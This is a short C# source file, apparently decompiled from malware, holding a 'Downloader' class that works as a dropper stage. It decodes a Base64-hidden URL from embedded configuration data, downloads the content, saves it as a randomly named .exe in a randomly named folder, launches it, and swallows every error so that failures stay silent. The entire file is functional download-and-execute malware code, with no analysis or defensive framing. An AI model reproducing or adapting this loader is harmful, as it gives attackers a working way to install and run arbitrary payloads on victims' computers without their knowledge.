using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

internal class Downloader
{
	public static void Load()
	{
		try
		{
			using (WebClient webClient = new WebClient())
			{
				string text = Exporter.Export("<ulfile>", "</ulfile>", Starter.FileData);
				if (!string.IsNullOrEmpty(text))
				{
					string text2 = $"{CreateDir.create(GetRandom.String(null, 8))}\\{GetRandom.String(null, 8)}.exe";
					if (File.Exists(text2))
					{
						File.Delete(text2);
					}
					File.WriteAllText(text2, webClient.DownloadString(Base64.Decode(text)), Encoding.GetEncoding(1251));
					Process.Start(text2);
				}
			}
		}
		catch
		{
		}
	}
}
